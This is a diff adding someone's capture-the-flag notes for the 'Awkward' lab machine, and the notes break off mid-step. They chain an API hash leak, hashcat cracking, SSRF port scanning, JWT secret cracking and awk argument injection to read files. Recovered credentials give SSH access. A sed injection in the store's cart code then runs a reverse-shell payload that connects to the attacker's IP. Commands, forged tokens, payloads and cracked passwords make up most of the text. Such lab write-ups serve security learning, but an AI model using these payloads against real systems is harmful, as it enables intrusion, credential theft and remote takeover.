@@ -1,0 +1,824 @@
+10.10.11.185
+
+
+http://hat-valley.htb/
+
+
+hat shop - buildinig an online shop
+
+a few employees names from homepage:
+
+Bean Hill
+Christine Wool
+Christopher Jones
+Jackson Lightheart
+
+
+may be useful for bruteforcing
+
+try fuzzing directories and vhosts
+
+http://store.hat-valley.htb/
+
+asks to signin 
+
+try burp
+
+there is an interesting Cookie:
+
+GET / HTTP/1.1
+Host: hat-valley.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: token=guest
+Upgrade-Insecure-Requests: 1
+If-None-Match: W/"b41-tn8t3x3qcvcm126OQ/i0AXwBj8M"
+
+Cookie: token=guest
+
+try to modify it 
+
+no changes 
+
+looking around in the page source there is an added js file:
+
+</script><script type="text/javascript" src="/js/app.js"></script>
+
+with some interesting info:
+
+view-source:http://hat-valley.htb/js/app.js
+
+ (function(module, exports, __webpack_require__) {
+
+            __webpack_require__( /*! /var/www/hat-valley.htb/node_modules/webpack/hot/dev-server.js */ "./node_modules/webpack/hot/dev-server.js");
+            __webpack_require__( /*! /var/www/hat-valley.htb/node_modules/webpack-dev-server/client/index.js?http://localhost:8080&sockPath=/sockjs-node */ "./node_modules/webpack-dev-server/client/index.js?http://localhost:8080&sockPath=/sockjs-node");
+            module.exports = __webpack_require__( /*! ./src/main.js */ "./src/main.js");
+
+
+./src/services/staff.js
+
+maybe this one could be interesting too
+
+
+./src/main.js   ---> simply the index page, nothing interesting
+
+./src/services/staff.js ----> I can't access this one
+
+/src/store/store.js ----> can't access
+
+./src/services/status.js
+
+./src/services/session.js
+
+./src/services/leave.js
+
+./src/router/router.js
+
+./src/HR.vue?vue&type=script&lang=js
+
+./src/Dashboard.vue?vue&type=script&lang=js
+
+
+baseURL = \"/api/\";\n\nvar login 
+
+baseURL = \"/api/\";\n\nvar staff_details
+
+baseURL = \"/api/\";\n\nvar store_status
+
+baseURL = \"/api/\";\n\nvar get_all
+
+looks like there are also some other andpoint (under /api/)
+
+try to access to these
+
+Cannot GET /api/get_all
+Cannot GET /api/login
+
+
+/api/staff_details
+
+JsonWebTokenError: jwt malformed
+    at Object.module.exports [as verify] (/var/www/hat-valley.htb/node_modules/jsonwebtoken/verify.js:63:17)
+    at /var/www/hat-valley.htb/server/server.js:151:30
+    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
+    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)
+    at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)
+    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
+    at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15
+    at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)
+    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:280:10)
+    at cookieParser (/var/www/hat-valley.htb/node_modules/cookie-parser/index.js:71:5)
+
+it says jwt malformed, does it mean that the:
+
+Cookie: token=guest
+
+was supposed to be a jwt token?
+
+it says malformed, I could try to modify it 
+
+Cookie: token=admin ----> same 
+
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+(valid random jwt token)
+
+JsonWebTokenError: invalid signature<br>
+
+I can try to delete it?
+
+yes It worked:
+
+
+GET /api/staff-details HTTP/1.1
+Host: hat-valley.htb
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+
+
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Fri, 20 Jan 2023 11:09:02 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 775
+Connection: close
+x-powered-by: Express
+access-control-allow-origin: *
+etag: W/"307-yT9RDkJOX+lsRRlC/J2nEu9d6Is"
+
+[{"user_id":1,"username":"christine.wool","password":"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649","fullname":"Christine Wool","role":"Founder, CEO","phone":"0415202922"},
+{"user_id":2,"username":"christopher.jones","password":"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1","fullname":"Christopher Jones","role":"Salesperson","phone":"0456980001"},
+{"user_id":3,"username":"jackson.lightheart","password":"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436","fullname":"Jackson Lightheart","role":"Salesperson","phone":"0419444111"},
+{"user_id":4,"username":"bean.hill","password":"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f","fullname":"Bean Hill","role":"System Administrator","phone":"0432339177"}]
+
+these are the same names on the homepage
+
+I can try to crack the pwds
+
+
+hash-identifier 6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649   
+
+Possible Hashs:
+[+] SHA-256
+[+] Haval-256
+
+hashcat -m 1400 
+
+e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123
+
+christopher.jones:chris123 
+
+maybe with these credentials I will be able to access 
+
+
+http://store.hat-valley.htb/
+
+
+No I still cannot access this vhost 
+
+no ssh
+
+maybe one of the pages I found before?
+
+
+./src/HR.vue?vue&type=script&lang=js
+
+./src/Dashboard.vue?vue&type=script&lang=js
+
+http://hat-valley.htb/dashboard redirects to http://hat-valley.htb/hr
+
+there is a login
+
+I can access with christopher.jones:chris123 
+
+There is a page to submit leave requests :
+
+http://hat-valley.htb/leave
+
+POST /api/submit-leave HTTP/1.1
+Host: hat-valley.htb
+Content-Length: 58
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Content-Type: application/json
+Origin: http://hat-valley.htb
+Referer: http://hat-valley.htb/leave
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc0MjE0ODc4fQ.RJlm9MBk5uSnh38Dqwy4g1PBgm4zayOU1bW1ciFnAtQ
+Connection: close
+
+{"reason":"prova","start":"21/01/2023","end":"02/02/2023"}
+
+It uses json (with a valid jwt token this time)
+
+then these datas are shown in a table, maybe I can use this to inject something in the web page?
+
+<iframe src='file:////etc/passwd' width=1000 height=1000 frameborder=0 id='frame'>
+
+not working, try with url encoding
+
+"%3Ciframe%20src%3D%27file%3A%2F%2F%2F%2Fetc%2Fpasswd%27%20width%3D1000%20height%3D1000%20frameborder%3D0%20id%3D%27frame%27%3E"
+
+It lets me add this to the leave requests but there is no injection.
+
+intercept the dashboard (main page) with burpsuite it performs various requests to /api/<stuff> to retrieve info
+
+one of these is 
+
+GET /api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22 HTTP/1.1
+Host: hat-valley.htb
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Referer: http://hat-valley.htb/dashboard
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc0MjE0ODc4fQ.RJlm9MBk5uSnh38Dqwy4g1PBgm4zayOU1bW1ciFnAtQ
+Connection: close
+
+which is basically a call to the other vhost:
+
+url="http://store.hat-valley.htb"
+
+various options:
+
+1) manipulate url parameter to interact with store vhost
+2) manipulate url parameter to download files on the host, for example a webshell
+
+first try to connect to my attack machine, download a file and see if I can access it:
+
+http://10.10.14.9:8000/prova
+http%3A%2F%2F10.10.14.9%3A8000%2Fprova
+
+10.10.11.185 - - [20/Jan/2023 06:57:44] "GET /prova HTTP/1.1" 200 -
+
+the content of the file is read and inserted in the response I get from the vhost:
+
+request
+
+GET /api/store-status?url=%22http%3A%2F%2F10.10.14.9%3A8000%2Fprova%22 HTTP/1.1
+Host: hat-valley.htb
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Referer: http://hat-valley.htb/dashboard
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc0MjE0ODc4fQ.RJlm9MBk5uSnh38Dqwy4g1PBgm4zayOU1bW1ciFnAtQ
+Connection: close
+
+
+response:
+
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Fri, 20 Jan 2023 11:57:45 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 11
+Connection: close
+x-powered-by: Express
+access-control-allow-origin: *
+etag: W/"b-JEoM8KGPQezEBR3ydTgCo5VeQM8"
+
+provaprova
+
+
+
+this can be used to find info about localhost exposed ports (if any)
+
+in the app.js file there was:
+
+?http://localhost:8080&sockPath=/sockjs-node
+
+so at least port 8080 is open on localhost
+It looks like there is the same page from port 80
+
+I should try to find other open ports, I can do this with wfuzz
+
+first I create the wordlist file (simply all the port numbers)
+
+seq 1 65535 > ports.txt
+
+
+
+wfuzz -w ports.txt http://hat-valley.htb/api/store-status?url=%22http%3A%2F%2Flocalhost%3AFUZZ%22
+
+wfuzz -w ports.txt --hl 0 http://hat-valley.htb/api/store-status?url=%22http%3A%2F%2Flocalhost%3AFUZZ%22 
+
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
+=====================================================================
+
+000000080:   200        8 L      13 W       132 Ch      "80"                                                                                                                                                                       
+000003002:   200        685 L    5834 W     77002 Ch    "3002"                                                                                                                                                                     
+000008080:   200        54 L     163 W      2881 Ch     "8080"
+
+let's check 3002
+
+I get a response, it is an explanation on how to use apis and also code snippets of the apis, maybe I can find something useful here
+
+
+Submit Leave (/api/submit-leave)
+
+const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]
+exec(`echo "${finalEntry}" >> /var/www/private/leave_requests.csv`
+
+
+All Leave (/api/all-leave)
+
+
+const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]
+
+
+  const badInUser = bad.some(char => user.includes(char));
+
+
+  if(badInUser) {
+
+    return res.status(500).send("Bad character detected.")
+
+  }
+
+
+  exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) 
+
+
+
+the exec command cannot be exploited because of the limitations in the badchars
+but the awk may be used to read arbitrary files because there is no need to use bad chars to make it read another file:
+
+only need space and /
+
+original:
+
+awk /<user>/ /var/www/private/leave_requests.csv
+
+objective:
+
+awk // /etc/passwd / /var/www/private/leave_requests.csv
+
+this way we should be able to make it print the content of both files
+
+so the user should be:
+
+/ /etc/passwd                   (with a space at the end)
+
+the problem is that it reads the user from the jwt token:
+
+
+if(user_token) {
+
+    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
+
+    if(!decodedToken.username) {
+
+      authFailed = true
+
+    }
+
+    else {
+
+      user = decodedToken.username
+
+    }
+
+  }
+
+
+so I need to find the TOKEN_SECRET to craft a jwt token.
+The only way I have now is to crack the jwt token to find the secret
+
+the current token:
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc0MjE0ODc4fQ.RJlm9MBk5uSnh38Dqwy4g1PBgm4zayOU1bW1ciFnAtQ
+
+{
+  "username": "christopher.jones",
+  "iat": 1674214878
+}
+
+}
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+
+I can use jwt_tool:
+
+
+python3 jwt_tool.py <JWToken> -C -d secrets.txt
+
+
+
+python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc0MjE0ODc4fQ.RJlm9MBk5uSnh38Dqwy4g1PBgm4zayOU1bW1ciFnAtQ -C -d /usr/share/wordlists/rockyou.txt
+
+[+] 123beany123 is the CORRECT key!
+You can tamper/fuzz the token contents (-T/-I) and sign it using:
+python3 jwt_tool.py [options here] -S hs256 -p "123beany123" 
+
+
+
+so the key is 123beany123
+
+I can use jwt.io to generate the modified jwt token
+
+{
+  "username": "/ /etc/passwd",
+  "iat": 1674214878
+}
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8gL2V0Yy9wYXNzd2QiLCJpYXQiOjE2NzQyMTQ4Nzh9.qswZxo4pKYlbWiRGfZ3v9NmM3KXyLLwm7dw-VelVfnM
+
+I receive failed to retrieve probably because there is an error in the command and even if it is able to print the content of the first file
+(/etc/passwd) it exit with an error status so the script gives an error:
+
+exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
+
+    if(stdout) {
+
+      return res.status(200).send(new Buffer(stdout, 'binary'));
+
+    }
+
+    if (error) {
+
+      return res.status(500).send("Failed to retrieve leave requests")
+
+    }
+
+    if (stderr) {
+
+      return res.status(500).send("Failed to retrieve leave requests")
+
+    }
+
+  })
+
+})
+
+
+/' /etc/passwd '
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2NzQyMTQ4Nzh9.nqaPaOR5F-i0rUFl7lgpRINOhTbAexWl0e7CTuAWscI
+
+
+I can read /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+syslog:x:104:111::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin
+systemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin
+tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
+whoopsie:x:117:124::/nonexistent:/bin/false
+sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
+speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+nm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+saned:x:121:128::/var/lib/saned:/usr/sbin/nologin
+colord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin
+pulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
+gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
+hplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false
+gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false
+bean:x:1001:1001:,,,:/home/bean:/bin/bash
+christine:x:1002:1002:,,,:/home/christine:/bin/bash
+postfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin
+mysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:130:65534::/run/sshd:/usr/sbin/nologin
+_laurel:x:999:999::/var/log/laurel:/bin/false
+
+
+try to read christine ssh keys 
+
+no keys found
+
+let's try with bean user
+
+nothing 
+
+try to get the /home/bean/.bashrc file or /home/christine/.bashrc file
+
+
+
+found this:
+
+# custom
+alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
+
+# Add an "alert" alias for long running commands.  Use like so:
+#   sleep 10; alert
+alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
+
+
+I can try to read the backup_home.sh script
+
+
+#!/bin/bash
+mkdir /home/bean/Documents/backup_tmp
+cd /home/bean
+tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
+date > /home/bean/Documents/backup_tmp/time.txt
+cd /home/bean/Documents/backup_tmp
+tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
+rm -r /home/bean/Documents/backup_tmp
+
+I have to dowload that ta.gz file /home/bean/Documents/backup/bean_backup_final.tar.gz
+
+ curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw" --output bean_backup_final.zip
+
+
+ Extract everything
+
+
+In the file:
+
+.config/xpad/content-DS1ZS1 i found:
+
+TO DO:
+- Get real hat prices / stock from Christine
+- Implement more secure hashing mechanism for HR system
+- Setup better confirmation message when adding item to cart
+- Add support for item quantity > 1
+- Implement checkout system
+
+boldHR SYSTEM/bold
+bean.hill
+014mrbeanrules!#P
+
+https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html
+
+boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold
+
+
+bean.hill
+014mrbeanrules!#P
+
+these looks like credentials, I hope for ssh 
+
+yes
+
+ssh bean@hat-valley.htb  
+bean@hat-valley.htb's password: 
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Last login: Sun Oct 23 21:38:08 2022 from 10.10.14.6
+bean@awkward:~$ id
+uid=1001(bean) gid=1001(bean) groups=1001(bean)
+bean@awkward:~$ pwd
+/home/bean
+bean@awkward:~$ cat user.txt 
+4da56b816159d7b6122cd513137cec81
+
+Sorry, user bean may not run sudo on awkward.
+
+finally found the store vhost content:
+
+bean@awkward:/var/www/store$ ls -lart
+total 104
+-rwxr-xr-x 1 root root   695 Sep 15 20:09 style.css
+-rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php
+-rwxr-xr-x 1 root root   918 Sep 15 20:09 README.md
+-rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php
+-rwxr-xr-x 1 root root  9143 Sep 15 20:09 checkout.php
+-rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php
+-rwxr-xr-x 1 root root  3664 Sep 15 20:09 cart_actions.php
+drwxr-xr-x 6 root root  4096 Oct  6 01:35 static
+drwxr-xr-x 3 root root  4096 Oct  6 01:35 js
+drwxr-xr-x 6 root root  4096 Oct  6 01:35 img
+drwxr-xr-x 2 root root  4096 Oct  6 01:35 fonts
+drwxr-xr-x 2 root root  4096 Oct  6 01:35 css
+drwxr-xr-x 9 root root  4096 Oct  6 01:35 .
+drwxrwxrwx 2 root root  4096 Oct  6 01:35 cart
+drwxr-xr-x 7 root root  4096 Oct  6 01:35 ..
+drwxrwxrwx 2 root root  4096 Jan 21 02:10 product-details
+bean@awkward:/var/www/store$ cat README.md 
+# Hat Valley - Shop Online!
+
+### To Do
+1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup
+2. Implement checkout system, link with credit card system (Stripe??)
+3. Implement shop filter
+4. Get full catalogue of items
+
+### How to Add New Catalogue Item
+1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID
+2. Change the fields to the appropriate values and save the file.  
+-- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. --
+
+### Hat Valley Cart
+Right now, the user's cart is stored within /cart, and is named according to the user's session ID. All products are appended to the same file for each user.
+To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website!
+
+
+looks interesting, everything is owned by root but I can modify some files and directories, I need to understando how the application uses those files
+
+
+
+first of alla I can find the password to access the vhost basic auth:
+
+bean@awkward:/var/www/store/product-details$ cat /etc/nginx/conf.d/.htpasswd 
+admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
+
+try to crack it:
+
+hashcat -m 1600 hash_admin  /usr/share/wordlists/rockyou.txt
+
+I wan't able to crack it, the only thing I can tru to do is to reuse bean credentials I found but with the username i found in the .htpasswd so:
+
+admin
+014mrbeanrules!#P
+
+
+in the page http://store.hat-valley.htb/shop.php
+
+I can see the products corresponding to the files in the directory:
+
+drwxrwxrwx 2 root root  4096 Jan 21 02:10 product-details
+
+I can modify it and I can modify/add new pproducts, maybe I can inject something in those files?
+It looks like this site is executed by root so I could be able to execute commands as root
+
+in the cart_actions.php there is a function to delete elements from cart:
+
+//delete from cart
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
+    $item_id = $_POST['item'];
+    $user_id = $_POST['user'];
+    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!
+
+    foreach($bad_chars as $bad) {
+        if(strpos($item_id, $bad) !== FALSE) {
+            echo "Bad character detected!";
+            exit;
+        }
+    }
+
+    foreach($bad_chars as $bad) {
+        if(strpos($user_id, $bad) !== FALSE) {
+            echo "Bad character detected!";
+            exit;
+        }
+    }
+    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
+        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
+        echo "Item removed from cart";
+    }
+    else {
+        echo "Invalid item";
+    }
+    exit;
+}
+
+
+
+I can use the sed command to execute a script
+
+bean@awkward:/var/www/store$ sed -h
+sed: invalid option -- 'h'
+Usage: sed [OPTION]... {script-only-if-no-other-script} [input-file]...
+
+  -n, --quiet, --silent
+                 suppress automatic printing of pattern space
+      --debug
+                 annotate program execution
+  -e script, --expression=script
+                 add the script to the commands to be executed
+
+I can create a script in the same folders of the products and execute it by setting the item_id to:
+
+-e <scriptname>
+
+$item_id = ' -e "1e /tmp/pwn.sh" /pwn.sh '
+
+pwn.sh :
+
+
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.9/9001 0>&1
+
+
+
+when I add something to the cart a new file is created:
+
+bean@awkward:/var/www/store/cart$ ls -alrt
+total 12
+drwxr-xr-x 9 root     root     4096 Oct  6 01:35 ..
+drwxrwxrwx 2 root     root     4096 Jan 21 03:24 .
+-rw-r--r-- 1 www-data www-data   96 Jan 21 03:24 c17f-7e04-e56-2428
+bean@awkward:/var/www/store/cart$ cat c17f-7e04-e56-2428 
+***Hat Valley Cart***
+item_id=1&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
+
+now I have to modify the file, I can't do this but I can create a new one and delete the "original" one (I have write permissions on the folder cart)
+
+
+
+bean@awkward:/var/www/store/cart$ touch /tmp/pwn.sh
+bean@awkward:/var/www/store/cart$ echo "bash -i >& /dev/tcp/10.10.14.9/9001 0>&1" > /tmp/pwn.sh 
+bean@awkward:/var/www/store/cart$ chmod 775 /tmp/pwn.sh 
+bean@awkward:/var/www/store/cart$ cp c17f-7e04-e56-2428 c17f-7e04-e56-2428_2
+bean@awkward:/var/www/store/cart$ cat c17f-7e04-e56-2428_2
+***Hat Valley Cart***
+item_id=1&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
+bean@awkward:/var/www/store/cart$ vi c17f-7e04-e56-2428_2
+bean@awkward:/var/www/store/cart$ cat c17f-7e04-e56-2428_2
+***Hat Valley Cart***
+item_id=&' -e "1e /tmp/pwn.sh" /pwn.sh 'item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
+bean@awkward:/var/www/store/cart$ rm c17f-7e04-e56-2428
+rm: remove write-protected regular file 'c17f-7e04-e56-2428'? y
+bean@awkward:/var/www/store/cart$ mv c17f-7e04-e56-2428_2 c17f-7e04-e56-2428
+bean@awkward:/var/www/store/cart$ ls
+c17f-7e04-e56-2428
+bean@awkward:/var/www/store/cart$ cat c17f-7e04-e56-2428
+***Hat Valley Cart***
+item_id=1' -e "1e /tmp/pwn.sh" /pwn.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
+
+
+now I have to delete it from the cart and get the reverse shell
+
+not working I will have to modify it intercepting the request with burp
+
+POST /cart_actions.php HTTP/1.1
+Host: store.hat-valley.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 49
+Origin: http://store.hat-valley.htb
+Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
+Connection: close
+Referer: http://store.hat-valley.htb/cart.php
+
+item=1' -e "1e /tmp/pwn.sh" /pwn.sh '&user=c17f-7e04-e56-2428&action=delete_item
+
+
+this payload is not working
+
+item=1'+-e+"1e+/tmp/pwn.sh"+/tmp/pwn.sh+'&user=c17f-7e04-e56-2428&action=delete_item
+
+I have to put the same data in the request and in the file because it will check that the data are equals in the script
+
+bean@awkward:/var/www/store/cart$ cp c17f-7e04-e56-2428 c17f-7e04-e56-2428_1
+bean@awkward:/var/www/store/cart$ nano c17f-7e04-e56-2428_1 
+bean@awkward:/var/www/store/cart$ rm c17f-7e04-e56-2428
+rm: remove write-protected regular file 'c17f-7e04-e56-2428'? y
+bean@awkward:/var/www/store/cart$ mv c17f-7e04-e56-2428_1 c17f-7e04-e56-2428
+bean@awkward:/var/www/store/cart$ cat c17f-7e04-e56-2428
+***Hat Valley Cart***
+item_id=1' -e "1e /tmp/pwn.sh" /tmp/pwn.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
+
+
+now In the web request:
+
